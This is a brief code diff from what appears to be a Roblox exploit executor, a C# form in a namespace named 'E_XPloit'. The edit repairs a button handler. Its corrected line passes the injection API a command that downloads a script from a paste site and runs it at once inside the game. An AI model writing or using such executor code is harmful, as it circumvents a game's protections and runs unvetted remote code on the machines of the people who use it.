@@ -29,10 +29,9 @@ namespace E_XPloit
         {
 
         }
-
         private void button6_Click(object sender, EventArgs e)
         {
-            SaladAPI.MainFunctions.Execute("loadstring(game:HttpGet(\"game:HttpGet(\"https://pastefy.app/YZoglOyJ/raw\", true))()");
+            SaladAPI.MainFunctions.Execute("loadstring(game:HttpGet(\"https://pastefy.app/YZoglOyJ/raw\", true))()");
         }
 
         private void button2_Click(object sender, EventArgs e)
